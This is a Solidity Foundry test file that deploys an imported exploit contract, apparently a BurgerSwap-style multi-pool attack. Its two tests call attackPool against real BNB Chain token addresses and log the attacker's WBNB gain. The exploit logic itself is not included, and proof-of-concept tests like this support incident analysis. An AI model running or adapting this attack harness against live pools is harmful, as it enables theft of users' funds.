// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerMultiExploit2.sol";

contract BurgerMultiTest2 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant ETH_TOKEN = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;

    function test_busd() public {
        address att = makeAddr("att");
        vm.deal(att, 1000 ether);
        vm.startPrank(att);

        BurgerMultiExploit2 e = new BurgerMultiExploit2();
        IWBNB(WBNB).deposit{value: 500 ether}();
        IWBNB(WBNB).transfer(address(e), 500 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));
        e.attackPool(BUSD, 300 ether, 15);
        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));

        emit log_named_int("BUSD pool WBNB delta", int256(wbnbAfter) - int256(wbnbBefore));
        vm.stopPrank();
    }

    function test_eth() public {
        address att = makeAddr("att");
        vm.deal(att, 100 ether);
        vm.startPrank(att);

        BurgerMultiExploit2 e = new BurgerMultiExploit2();
        IWBNB(WBNB).deposit{value: 80 ether}();
        IWBNB(WBNB).transfer(address(e), 80 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));
        e.attackPool(ETH_TOKEN, 30 ether, 15);
        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));

        emit log_named_int("ETH pool WBNB delta", int256(wbnbAfter) - int256(wbnbBefore));
        vm.stopPrank();
    }
}
